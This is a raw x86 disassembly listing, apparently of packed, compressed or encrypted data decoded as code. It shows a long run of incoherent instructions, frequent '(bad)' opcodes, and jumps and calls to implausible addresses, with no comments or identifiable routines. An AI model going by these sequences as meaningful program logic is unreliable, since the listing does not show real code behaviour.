  41968b:	cmp    al,0xa8
  41968d:	sub    eax,0x2a6a60c9
  419692:	jb     0x419640
  419694:	and    eax,0x7084e305
  419699:	clc    
  41969a:	and    BYTE PTR [ecx-0x52be95ac],ah
  4196a0:	ja     0x4196ef
  4196a2:	ss jae 0x4196d1
  4196a5:	out    0xba,eax
  4196a7:	or     BYTE PTR [edi],dl
  4196a9:	or     DWORD PTR [edx+0x6f],0x4b57a7c4
  4196b0:	mov    ebx,0xbdd17f04
  4196b5:	mov    bl,0x5b
  4196b7:	out    dx,eax
  4196b8:	xor    bl,dh
  4196ba:	inc    esp
  4196bb:	test   esp,esp
  4196bd:	jp     0x419658
  4196bf:	jmp    edi
  4196c1:	dec    ecx
  4196c2:	jb     0x41966e
  4196c4:	pop    esi
  4196c5:	add    DWORD PTR [esi],0x55
  4196c8:	push   esi
  4196c9:	pop    ds
  4196ca:	and    DWORD PTR [edi+0x1f581385],ecx
  4196d0:	lock xor DWORD PTR [ecx],edi
  4196d3:	sub    dh,BYTE PTR [esi+0x2c]
  4196d6:	and    BYTE PTR [ebp+0x195294b8],dl
  4196dc:	mov    cl,0x78
  4196de:	loope  0x419722
  4196e0:	stos   BYTE PTR es:[edi],al
  4196e1:	popf   
  4196e2:	sbb    al,0x88
  4196e4:	les    ecx,FWORD PTR [eax+0x2]
  4196e7:	mov    esi,eax
  4196e9:	mov    ebp,0xf480d7e7
  4196ee:	mov    al,ds:0xb73b0a63
  4196f3:	stc    
  4196f4:	push   ecx
  4196f5:	add    bh,BYTE PTR [edx-0x5e7e326c]
  4196fb:	cmp    DWORD PTR [ebp+eiz*2+0x170d48e3],eax
  419702:	add    al,ah
  419704:	test   al,0x1f
  419706:	dec    eax
  419707:	outs   dx,DWORD PTR ds:[esi]
  419708:	fidiv  DWORD PTR [ebx]
  41970a:	pop    es
  41970b:	mov    cl,0xea
  41970d:	gs sbb al,0xe4
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x6e8dd0ae
  419781:	mov    ds:0xdc8d6db,al
  419786:	add    DWORD PTR [eax],eax
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	mov    dl,0x29
  41978e:	mov    dh,0x5a
  419790:	cli    
  419791:	xchg   DWORD PTR [ebx],edi
  419793:	cld    
  419794:	mov    ebp,0xb1eb6f3e
  419799:	lea    eax,[ebp-0x5a]
  41979c:	sbb    al,0x1d
  41979e:	xor    eax,0x9e295290
  4197a3:	mov    ah,0x66
  4197a5:	sbb    edx,DWORD PTR [ebx+0x23c7401]
  4197ab:	inc    edx
  4197ac:	or     BYTE PTR [edi],bh
  4197ae:	mov    bl,0xee
  4197b0:	scas   eax,DWORD PTR es:[edi]
  4197b1:	jo     0x4197e4
  4197b3:	mov    esp,DWORD PTR [edx-0x2b]
  4197b6:	retf   
  4197b7:	xchg   ebp,eax
  4197b8:	mov    eax,ds:0x6fd2c0bb
  4197bd:	mov    WORD PTR [eax],es
  4197bf:	bound  ecx,QWORD PTR [ebp+0x1a949170]
  4197c5:	ret    0x64b2
  4197c8:	ins    BYTE PTR es:[edi],dx
  4197c9:	push   0xbdf1a848
  4197ce:	test   ebx,ecx
  4197d0:	cmp    BYTE PTR [esi+0x72],ah
  4197d3:	add    DWORD PTR [ecx],ebx
  4197d5:	dec    esi
  4197d6:	rcl    ebx,0xd7
  4197d9:	or     BYTE PTR [ecx-0x2be2df88],dh
  4197df:	cwde   
  4197e0:	or     bh,BYTE PTR ds:[edi+edx*1]
  4197e4:	adc    al,0x72
  4197e6:	xchg   DWORD PTR [ebx+0x27],esp
  4197e9:	ss cmc 
  4197eb:	and    edi,DWORD PTR [edx]
  4197ed:	pop    esp
  4197ee:	mov    ecx,0x98d874a0
  4197f3:	fadd   QWORD PTR ds:[edi+0x3afddbd0]
  4197fa:	inc    edx
  4197fb:	push   0xad744741
  419800:	push   ebx
  419801:	scas   al,BYTE PTR es:[edi]
  419802:	lock or BYTE PTR [ebx+0x26],al
  419806:	mov    al,BYTE PTR [esi+0x7f3dce28]
  41980c:	stos   BYTE PTR es:[edi],al
  41980d:	in     eax,dx
  41980e:	ins    BYTE PTR es:[edi],dx
  41980f:	xor    BYTE PTR [eax],ah
  419811:	push   ds
  419812:	sbb    BYTE PTR [ecx],0xb6
  419815:	cwde   
  419816:	out    dx,al
  419817:	gs retf 0x4f26
  41981b:	ja     0x4197e4
  41981d:	jecxz  0x419851
  41981f:	mov    ecx,0x7847e841
  419824:	daa    
  419825:	cmp    eax,0xd5b97316
  41982a:	mov    ch,BYTE PTR [ebx-0x27d55b28]
  419830:	cld    
  419831:	(bad)  
  419832:	push   ds
  419833:	adc    esi,DWORD PTR [edx-0x48]
  419836:	inc    eax
  419837:	sbb    BYTE PTR [edx+eax*1],0xd2
  41983b:	hlt    
  41983c:	bound  edi,QWORD PTR [ebx-0x7e7dbb1b]
  419842:	ja     0x41984d
  419844:	sub    al,0x68
  419846:	mov    eax,0xb32700f4
  41984b:	fild   WORD PTR [ebp+esi*4-0x33]
  41984f:	fucomp st(5)
  419851:	scas   al,BYTE PTR es:[edi]
  419852:	call   0xd8e29807
  419857:	sub    DWORD PTR fs:[eax+ebx*4-0x2bc19bc0],edx
  41985f:	int    0xa4
  419861:	jb     0x41981a
  419863:	mov    ebx,0x4cd46c4c
  419868:	push   edx
  419869:	dec    esp
  41986a:	pop    eax
  41986b:	stc    
  41986c:	scas   al,BYTE PTR es:[edi]
  41986d:	lods   eax,DWORD PTR ds:[esi]
  41986e:	or     ebp,0xffffffbc
  419871:	sub    ah,dh
  419873:	mov    DWORD PTR [ecx-0x1c935ca4],edx
  419879:	call   0x99edab2d
  41987e:	xchg   DWORD PTR [eax],esp
  419880:	inc    eax
  419881:	retf   
  419882:	loopne 0x4198c3
  419884:	rcl    DWORD PTR ds:0xc446234c,1
  41988a:	xchg   ecx,eax
  41988b:	inc    esi
  41988c:	mov    eax,0xfeb22b
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fstp   QWORD PTR [edx-0x33693bdc]
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	adc    DWORD PTR [ecx-0x33834b38],eax
  419912:	sub    al,0xc5
  419914:	arpl   WORD PTR [edi+0x68],dx
  419917:	stos   DWORD PTR es:[edi],eax
  419918:	(bad)  
  419919:	fistp  WORD PTR [bx+di+0x463d]
  41991e:	mov    ebp,0x44cb2492
  419923:	adc    BYTE PTR [esi],cl
  419925:	dec    ebp
  419926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419927:	mov    edi,0xe9ebd44e
  41992c:	cwde   
  41992d:	push   edx
  41992e:	jg     0x419963
  419930:	xchg   edi,eax
  419931:	sub    DWORD PTR [eax],eax
  419933:	test   BYTE PTR [ebp-0x45],dh
  419936:	stos   BYTE PTR es:[edi],al
  419937:	pop    ebp
  419938:	retf   
  419939:	xor    al,0x5a
  41993b:	xchg   DWORD PTR [edx+edx*2+0x4c2187fc],eax
  419942:	xchg   ebp,eax
  419943:	rol    BYTE PTR ds:[edi+0x7d],0x7b
  419948:	cmp    ch,BYTE PTR [esi+0x1e1d8515]
  41994e:	out    dx,al
  41994f:	and    ebx,esi
  419951:	sbb    eax,0xb186f323
  419956:	cld    
  419957:	arpl   ax,bp
  419959:	shl    DWORD PTR ds:0x190e4aea,cl
  41995f:	xchg   ebp,eax
  419960:	(bad)  [ebp-0x77]
  419963:	aaa    
  419964:	leave  
  419965:	sub    DWORD PTR [edi+0x17],esp
  419968:	push   es
  419969:	mov    ecx,0xcdb754dd
  41996e:	jns    0x419987
  419970:	sub    esi,DWORD PTR [ecx-0x30]
  419973:	xchg   ecx,eax
  419974:	mov    al,ds:0xd9dd0880
  419979:	push   ds
  41997a:	mov    ebx,DWORD PTR [ecx]
  41997c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41997d:	arpl   WORD PTR [edx+0x3a],si
  419980:	pop    ecx
  419981:	bound  eax,QWORD PTR [ecx+0x530edf55]
  419987:	in     al,dx
  419988:	daa    
  419989:	lods   eax,DWORD PTR ds:[esi]
  41998a:	dec    edi
  41998b:	out    0xe6,al
  41998d:	mov    esp,0x3ad0eb09
  419992:	push   0xffffffe7
  419994:	adc    eax,0x670ca61a
  419999:	push   edx
  41999a:	cmp    BYTE PTR [esi-0x61],ch
  41999d:	push   eax
  41999e:	jmp    0xb4602b75
  4199a3:	stos   DWORD PTR es:[edi],eax
  4199a4:	xchg   BYTE PTR [ebx-0x2a936d60],cl
  4199aa:	movd   mm7,DWORD PTR [esi]
  4199ad:	mov    BYTE PTR [esi],bh
  4199af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199b0:	dec    esi
  4199b1:	add    edi,ebp
  4199b3:	add    BYTE PTR [edx],0x99
  4199b6:	xor    al,0xe3
  4199b8:	shr    BYTE PTR [ebx+0x69da0839],0xd1
  4199bf:	test   ecx,esi
  4199c1:	xor    eax,0x7cbd6bc0
  4199c6:	test   eax,edi
  4199c8:	clc    
  4199c9:	in     eax,0x9e
  4199cb:	sub    eax,0xc640e76e
  4199d0:	fld    st(5)
  4199d2:	and    BYTE PTR [eax+ebx*4],dl
  4199d5:	mov    ?,WORD PTR [ebx+0x2256ce0f]
  4199db:	sbb    BYTE PTR [esi],0x69
  4199de:	add    ebp,DWORD PTR [ebx-0x710b7ddc]
  4199e4:	outs   dx,DWORD PTR cs:[esi]
  4199e6:	mov    eax,ds:0xb2adb79c
  4199eb:	add    ebp,DWORD PTR [edx]
  4199ed:	cmp    eax,DWORD PTR [ecx-0x75e33578]
  4199f3:	push   0x24
  4199f5:	jbe    0x419a56
  4199f7:	mov    BYTE PTR [ebp+0x6],dl
  4199fa:	nop
  4199fb:	test   BYTE PTR [ecx-0x31120e13],dh
  419a01:	cli    
  419a02:	int3   
  419a03:	leave  
  419a04:	repnz (bad) 
  419a07:	pop    es
  419a08:	js     0x4199f9
  419a0a:	mov    bh,0xcc
  419a0d:	inc    edx
  419a0e:	xchg   ecx,eax
  419a0f:	or     DWORD PTR [eax],eax
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0xe9c215d3
  419a81:	pop    ebp
  419a82:	jl     0x419aed
  419a84:	ror    BYTE PTR [edi],1
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	sub    al,BYTE PTR [ebx+0x24dc8e9e]
  419a92:	or     bl,BYTE PTR [edx+0x18]
  419a95:	sub    cl,al
  419a97:	lahf   
  419a98:	dec    ecx
  419a99:	mov    dh,0xe5
  419a9b:	add    ebp,DWORD PTR [ecx-0x183ec134]
  419aa1:	inc    ebx
  419aa2:	or     al,0x34
  419aa4:	add    al,0x33
  419aa6:	mov    ah,0xe7
  419aa8:	arpl   WORD PTR [edx+0x77],bx
  419aab:	stos   BYTE PTR es:[edi],al
  419aac:	pop    ecx
  419aad:	inc    esi
  419aae:	(bad)  
  419aaf:	inc    DWORD PTR [edi]
  419ab1:	call   0x1546582c
  419ab6:	fidivr DWORD PTR [ebp-0x74]
  419ab9:	push   ecx
  419aba:	das    
  419abb:	lods   al,BYTE PTR ds:[esi]
  419abc:	jp     0x419af5
  419abe:	jne    0x419aa1
  419ac0:	rcl    al,0xf0
  419ac3:	(bad)  
  419ac4:	test   DWORD PTR [eax],0x5714aa0b
  419aca:	bound  ebp,QWORD PTR [edx]
  419acc:	repz inc eax
  419acf:	push   esp
  419ad0:	ins    DWORD PTR es:[edi],dx
  419ad1:	xchg   ebp,eax
  419ad2:	mov    al,BYTE PTR [eax+0x3f]
  419ad5:	fsubr  DWORD PTR [ebx-0x42eed1c6]
  419adb:	repnz mov cl,0x93
  419ade:	xlat   BYTE PTR ds:[ebx]
  419adf:	xor    al,0x65
  419ae1:	aad    0x1d
  419ae3:	xchg   cl,bl
  419ae5:	cdq    
  419ae6:	icebp  
  419ae7:	(bad)  
  419ae8:	je     0x419b1e
  419aea:	pop    ecx
  419aeb:	xor    DWORD PTR [eax+0x3cb5ab47],0xe38a7b7d
  419af5:	rcl    BYTE PTR [eax-0x3b],cl
  419af8:	js     0x419b58
  419afa:	dec    edx
  419afb:	pop    ds
  419afc:	cmp    eax,0xde7aaecd
  419b01:	fist   WORD PTR [esi+0x7e]
  419b04:	dec    esi
  419b05:	sahf   
  419b06:	(bad)  
  419b07:	mov    bh,0xb4
  419b09:	dec    edx
  419b0a:	rcr    BYTE PTR [edx],0x9b
  419b0d:	call   FWORD PTR [edx]
  419b0f:	adc    BYTE PTR [esi+0x5a],ch
  419b12:	out    0xd,al
  419b14:	jmp    0x419b6b
  419b16:	sub    eax,0x4293b13e
  419b1b:	repnz push ebp
  419b1d:	mov    al,ds:0xe83ffca5
  419b22:	mov    edi,0x4030f161
  419b27:	setnp  BYTE PTR [edi+0x65]
  419b2b:	rcl    ebp,1
  419b2d:	enter  0x2fe5,0x56
  419b31:	clc    
  419b32:	xchg   ebp,eax
  419b33:	mov    eax,ds:0x1c3a0228
  419b38:	xchg   esp,eax
  419b39:	lock mov esi,0x15f142bd
  419b3f:	push   eax
  419b40:	cli    
  419b41:	arpl   WORD PTR [ecx],bp
  419b43:	dec    esp
  419b44:	idiv   DWORD PTR [ebx-0x6fd08882]
  419b4a:	aas    
  419b4b:	and    DWORD PTR [ebx-0x2e3749ec],ebp
  419b51:	in     al,0xd4
  419b53:	repz mov fs:0x5ba12db7,al
  419b5a:	fs fsubr st,st(4)
  419b5d:	push   esp
  419b5e:	lea    edi,[ecx]
  419b60:	dec    esi
  419b61:	lock and eax,0x9a8d38a
  419b67:	mov    ecx,0x4bdd5a3e
  419b6c:	mov    dh,BYTE PTR [ebx]
  419b6e:	loopne 0x419b80
  419b70:	inc    esp
  419b71:	add    bl,bl
  419b73:	test   cl,cl
  419b75:	lods   eax,DWORD PTR ds:[esi]
  419b76:	sub    DWORD PTR [ecx-0x16],esi
  419b79:	push   bp
  419b7b:	and    al,0x18
  419b7d:	push   esi
  419b7e:	fcom   DWORD PTR [ecx+0xe1719ed]
  419b84:	sub    esi,ebp
  419b86:	xor    BYTE PTR [edi],dl
  419b88:	std    
  419b89:	out    dx,eax
  419b8a:	rol    edx,0x92
  419b8d:	imul   ebp,DWORD PTR [esi+0x27],0x0
	...
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x32
  419c01:	inc    DWORD PTR [edi+eiz*2]
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	out    0x88,al
  419c0e:	and    ebx,0xffffffce
  419c11:	rcr    BYTE PTR [edi],0x88
  419c14:	gs pushf 
  419c16:	jae    0x419c97
  419c18:	sbb    bl,al
  419c1a:	dec    ebp
  419c1b:	stos   BYTE PTR es:[edi],al
  419c1c:	xchg   edx,eax
  419c1d:	test   ecx,ebx
  419c1f:	add    BYTE PTR [esi+0x374c527a],0x50
  419c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c27:	in     ax,0x85
  419c2a:	into   
  419c2b:	pop    edi
  419c2c:	fmul   st(6),st
  419c2e:	sbb    eax,0xb3cff97b
  419c33:	scas   eax,DWORD PTR es:[edi]
  419c34:	xchg   ebx,eax
  419c35:	scas   al,BYTE PTR es:[edi]
  419c36:	pop    esi
  419c37:	xchg   esp,eax
  419c38:	jo     0x419c38
  419c3a:	sahf   
  419c3b:	scas   al,BYTE PTR es:[edi]
  419c3c:	stos   DWORD PTR es:[edi],eax
  419c3d:	dec    eax
  419c3e:	jp     0x419c7e
  419c40:	mov    edx,0x72ace160
  419c45:	popa   
  419c46:	and    al,bh
  419c48:	jno    0x419c0e
  419c4a:	push   es
  419c4b:	stc    
  419c4c:	pop    ds
  419c4d:	xor    ah,BYTE PTR [ebp-0x3c]
  419c50:	sbb    al,BYTE PTR [edx+0x4b8912b0]
  419c56:	jns    0x419c62
  419c58:	inc    esp
  419c59:	and    BYTE PTR [edi],0xe9
  419c5c:	jbe    0x419bfd
  419c5e:	sti    
  419c5f:	into   
  419c60:	ss ds xor al,0xdc
  419c64:	jge    0x419bfc
  419c66:	popa   
  419c67:	ins    BYTE PTR es:[edi],dx
  419c68:	mov    cl,0x92
  419c6a:	call   0x4485:0x4ece531f
  419c71:	inc    ecx
  419c72:	test   DWORD PTR [esi+ebp*2-0x41],ecx
  419c76:	adc    al,0x5b
  419c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c79:	push   cs
  419c7a:	push   0xffffff83
  419c7c:	jns    0x419c9a
  419c7e:	into   
  419c7f:	pop    es
  419c80:	mov    eax,0xa492c25f
  419c85:	add    edx,DWORD PTR [eax]
  419c87:	into   
  419c88:	int    0xeb
  419c8a:	xor    DWORD PTR [esi-0x20],edi
  419c8d:	pop    es
  419c8e:	inc    eax
  419c8f:	sub    eax,DWORD PTR [eax-0x47]
  419c92:	std    
  419c93:	inc    BYTE PTR [ecx-0x19a9587d]
  419c99:	popa   
  419c9a:	daa    
  419c9b:	popf   
  419c9c:	fs (bad) 
  419c9e:	mov    ds:0x14705862,al
  419ca3:	xchg   esp,eax
  419ca4:	dec    ebx
  419ca5:	das    
  419ca6:	pop    es
  419ca7:	pusha  
  419ca8:	fist   WORD PTR [ebp+0x4a]
  419cab:	fsub   st,st(7)
  419cad:	adc    ecx,DWORD PTR [ecx-0x576efc5b]
  419cb3:	retf   0xa46a
  419cb6:	sbb    al,0x80
  419cb8:	and    al,0x94
  419cba:	mov    esi,DWORD PTR [esi]
  419cbc:	cmp    DWORD PTR [ecx-0x16],esp
  419cbf:	inc    esp
  419cc0:	test   DWORD PTR [edx+0x22],0xfdcb6e19
  419cc7:	xor    esi,DWORD PTR [ebp-0x7b]
  419cca:	jae    0x419cd0
  419ccc:	add    cl,BYTE PTR [esi+0x4f]
  419ccf:	fmul   QWORD PTR [ebx+0x2e]
  419cd2:	and    DWORD PTR [ebx+0x27332903],esp
  419cd8:	test   eax,0x95a7a42f
  419cdd:	pop    es
  419cde:	inc    esi
  419cdf:	mov    edx,0x40c8b5d0
  419ce4:	mov    edx,0x360dbe94
  419ce9:	sahf   
  419cea:	fidivr DWORD PTR [ebp-0x445defbe]
  419cf0:	mov    ds:0xdcb14141,eax
  419cf5:	push   ebx
  419cf6:	push   0x68
  419cf8:	mov    edi,0x949db67e
  419cfd:	sub    BYTE PTR [edx],al
  419cff:	mov    esp,0xfad1c6b1
  419d04:	(bad)  
  419d05:	rcr    bl,0x26
  419d08:	push   DWORD PTR [ebx+0x69961524]
  419d0e:	jle    0x419cb0
	...
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fisub  DWORD PTR ss:[ecx]
  419d81:	pop    esi
  419d82:	fs (bad) 
  419d84:	fcom   DWORD PTR [ecx]
  419d86:	add    DWORD PTR [eax],eax
  419d88:	add    al,0x1
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	mov    esp,0xbf6af727
  419d91:	mov    bl,0x15
  419d93:	xchg   esi,eax
  419d94:	mov    ah,0xa0
  419d96:	xchg   edi,esi
  419d98:	cld    
  419d99:	aaa    
  419d9a:	push   ebx
  419d9b:	cmc    
  419d9c:	rcl    ah,cl
  419d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d9f:	addr16 out 0x97,al
  419da2:	adc    BYTE PTR [ebx],al
  419da4:	(bad)  [ecx]
  419da6:	pusha  
  419da7:	jne    0x419dc5
  419da9:	cmc    
  419daa:	sbb    esi,DWORD PTR [ecx]
  419dac:	popf   
  419dad:	enter  0xd47a,0x64
  419db1:	push   DWORD PTR [edi]
  419db3:	push   edx
  419db4:	(bad)  
  419db5:	jmp    0xa7b2:0x46bff1a6
  419dbc:	popa   
  419dbd:	xor    esi,ebp
  419dbf:	xor    DWORD PTR [ebx+0x71305ec2],ebx
  419dc5:	pop    esp
  419dc6:	mov    ch,0xb0
  419dc8:	mov    esp,0x7e4796ad
  419dcd:	jmp    0x3379f91a
  419dd2:	sbb    esp,DWORD PTR [esi]
  419dd4:	mov    eax,0xfcf9b43a
  419dd9:	icebp  
  419dda:	pop    edi
  419ddb:	mov    edx,0x17a6baee
  419de0:	push   ebp
  419de1:	sbb    BYTE PTR [edx-0x17],dh
  419de4:	jmp    0x419de7
  419de6:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419de8:	add    bl,bh
  419dea:	sar    DWORD PTR [ecx-0x74ee83e8],0x3b
  419df1:	pop    ds
  419df2:	sub    bh,BYTE PTR [edx-0x6f]
  419df5:	fstp   QWORD PTR [esi+0x2b711457]
  419dfb:	loope  0x419db2
  419dfd:	imul   ebp,DWORD PTR [ecx+0x59],0x851da100
  419e04:	inc    edx
  419e05:	(bad)  
  419e06:	pop    eax
  419e07:	loope  0x419dbe
  419e09:	xchg   edi,eax
  419e0a:	inc    ecx
  419e0b:	js     0x419dad
  419e0d:	aad    0xa1
  419e0f:	sbb    al,BYTE PTR [esi+edx*2+0x74a97f6d]
  419e16:	mov    cl,0xf7
  419e18:	sub    eax,0x26320
  419e1d:	aaa    
  419e1e:	aad    0x5d
  419e20:	pop    edx
  419e21:	daa    
  419e22:	outs   dx,BYTE PTR es:[esi]
  419e24:	fldenv [ebx+0x217410a8]
  419e2a:	aaa    
  419e2b:	jnp    0x419e5b
  419e2d:	push   es
  419e2e:	jmp    0x419e13
  419e30:	push   0x9e4d03b5
  419e35:	(bad)  
  419e36:	into   
  419e37:	inc    eax
  419e38:	ror    cl,0xc3
  419e3b:	in     eax,0x40
  419e3d:	push   ebx
  419e3e:	pop    ebp
  419e3f:	aas    
  419e40:	dec    edx
  419e41:	and    ebp,ebx
  419e43:	push   0xf
  419e45:	xchg   ecx,eax
  419e46:	ficom  DWORD PTR ds:0xdff9ed6f
  419e4c:	push   ebx
  419e4d:	ret    
  419e4e:	shl    DWORD PTR fs:[esp+ebx*4+0x12],0x1f
  419e54:	jne    0x419de1
  419e56:	xchg   esp,eax
  419e57:	push   eax
  419e58:	rol    ebp,cl
  419e5a:	sub    al,0x59
  419e5c:	xor    eax,edi
  419e5e:	enter  0x57bf,0x48
  419e62:	jbe    0x419e97
  419e64:	hlt    
  419e65:	mov    edx,0x8bcbe9d8
  419e6a:	imul   ebp,DWORD PTR gs:[ebx+0x46],0xffffffd3
  419e6f:	push   ebx
  419e70:	dec    esp
  419e71:	mov    esi,0xafc071d3
  419e76:	ja     0x419edf
  419e78:	sbb    eax,0x8f0d6087
  419e7d:	adc    eax,0x71301886
  419e82:	je     0x419edc
  419e84:	pop    edx
  419e85:	retf   0x63ad
  419e88:	mov    eax,ds:0xd74b56c7
  419e8d:	fnstsw WORD PTR [eax-0x36]
	...
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	xor    al,0xe3
  419f02:	mov    al,ds:0x112dc32
  419f07:	add    BYTE PTR [ecx+eax*1],al
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	popa   
  419f0d:	data16 mov bh,0x5f
  419f10:	fwait
  419f11:	add    ecx,edi
  419f13:	(bad)  [esi]
  419f15:	pop    ss
  419f16:	hlt    
  419f17:	or     DWORD PTR [ecx+0x3fafa5ac],edx
  419f1d:	and    DWORD PTR [edi],ecx
  419f1f:	dec    eax
  419f20:	mul    BYTE PTR [eax+0x17]
  419f23:	arpl   WORD PTR [edi+ebx*4],dx
  419f26:	pop    esp
  419f27:	fcmovne st,st(5)
  419f29:	imul   ecx,DWORD PTR [ecx-0x29],0x8fe43e35
  419f30:	cmp    al,0x4b
  419f32:	pop    ss
  419f33:	jmp    0x419ee6
  419f35:	ret    0x774a
  419f38:	aam    0xf4
  419f3a:	fneni(8087 only) 
  419f3c:	or     al,0x9b
  419f3e:	dec    ecx
  419f3f:	stos   DWORD PTR es:[edi],eax
  419f40:	dec    edx
  419f41:	push   ds
  419f42:	dec    DWORD PTR [ebp-0x108a68c5]
  419f48:	pop    ebp
  419f49:	mov    bh,0x4c
  419f4b:	fisubr WORD PTR [ebp-0x2929da8f]
  419f51:	dec    ebp
  419f52:	call   0x2fb72be7
  419f57:	or     ch,BYTE PTR [ebp+ecx*2+0x6053c467]
  419f5e:	jl     0x419f4f
  419f60:	cmp    ecx,DWORD PTR [ebx-0x49]
  419f63:	jmp    0x3302:0x16fd061c
  419f6a:	ret    0xb759
  419f6d:	ds ret 0xefdc
  419f71:	jmp    0x419efb
  419f73:	bound  ebp,QWORD PTR [ecx-0x671a2f85]
  419f79:	jle    0x419ff2
  419f7b:	inc    esi
  419f7c:	mov    edx,0x5ab55085
  419f81:	sub    DWORD PTR [ebx-0x316dc52d],esp
  419f87:	retf   0x4233
  419f8a:	outs   dx,BYTE PTR ds:[esi]
  419f8b:	inc    ebx
  419f8c:	icebp  
  419f8d:	lods   eax,DWORD PTR ds:[esi]
  419f8e:	js     0x419f50
  419f90:	and    al,0x6d
  419f92:	add    eax,0xf3930c8e
  419f97:	xchg   ebp,eax
  419f98:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  419f9a:	out    dx,al
  419f9b:	pop    ss
  419f9c:	inc    eax
  419f9e:	pusha  
  419f9f:	push   0xfa881838
  419fa4:	aam    0x88
  419fa6:	les    ebp,FWORD PTR [esi+0x1b]
  419fa9:	cmp    ebp,0xdee6b97b
  419faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fb0:	ret    0xee46
  419fb3:	mov    cl,0x95
  419fb5:	lods   eax,DWORD PTR ds:[esi]
  419fb6:	add    dh,dh
  419fb8:	pop    esi
  419fb9:	aam    0x2b
  419fbb:	mov    dl,0x7
  419fbd:	jmp    0x419f95
  419fbf:	xor    al,0x5f
  419fc1:	je     0x41a034
  419fc3:	lahf   
  419fc4:	cmp    cl,bh
  419fc6:	push   di
  419fc8:	imul   DWORD PTR [edx]
  419fca:	fld    QWORD PTR [eax]
  419fcc:	imul   edi,DWORD PTR [ebp+0x2e],0x7f
  419fd0:	pop    ebx
  419fd1:	call   0x95cf:0xa5b0526b
  419fd8:	sub    dl,BYTE PTR [esi-0x621a966d]
  419fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fdf:	inc    esi
  419fe0:	dec    ebx
  419fe1:	iret   
  419fe2:	adc    DWORD PTR [ebp-0xd873d3b],0xd2fb082f
  419fec:	cmp    esp,DWORD PTR [eax-0x58]
  419fef:	pop    ds
  419ff0:	xchg   ecx,eax
  419ff1:	inc    edi
  419ff2:	lahf   
  419ff3:	cmp    BYTE PTR [edx+0x77],ah
  419ff6:	inc    edx
  419ff7:	add    ah,BYTE PTR [ecx]
  419ff9:	in     eax,dx
  419ffa:	inc    ecx
  419ffb:	mov    cs,edi
  419ffd:	fwait
  419ffe:	sub    BYTE PTR [eax+0x6b],dh
  41a001:	mov    ebp,DWORD PTR [ebx+0x20]
  41a004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a005:	mov    fs,esp
  41a007:	stos   BYTE PTR es:[edi],al
  41a008:	push   cs
  41a009:	(bad)  
  41a00b:	fisubr DWORD PTR [edx+0x68cb20]
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x3c],bh
  41a081:	pusha  
  41a082:	mov    edx,0x113e077
  41a087:	add    BYTE PTR [ecx+eax*1],al
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	dec    ebx
  41a08d:	pop    ss
  41a08e:	pusha  
  41a08f:	ret    0xfdcb
  41a092:	or     eax,0x5aab85e5
  41a097:	adc    dl,dl
  41a099:	mov    bl,0x3
  41a09b:	(bad)  
  41a09c:	(bad)  
  41a09d:	les    ecx,FWORD PTR [eax+0x65]
  41a0a0:	pop    esp
  41a0a1:	xchg   dl,cl
  41a0a3:	test   BYTE PTR [edx+0x68],ah
  41a0a6:	in     al,dx
  41a0a7:	jbe    0x41a0b5
  41a0a9:	jb     0x41a118
  41a0ab:	cdq    
  41a0ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0ad:	pushf  
  41a0ae:	adc    al,0xc5
  41a0b0:	adc    DWORD PTR [ebx+ebx*8+0x54],esi
  41a0b4:	mov    esi,0x1af05ff9
  41a0b9:	jg     0x41a065
  41a0bb:	fistp  DWORD PTR [esp+ebx*1+0x5a]
  41a0bf:	dec    eax
  41a0c0:	int    0x1b
  41a0c2:	(bad)
  41a0c5:	jmp    0x41a107
  41a0c7:	out    0xb7,eax
  41a0c9:	addr16 call 0x51b14a16
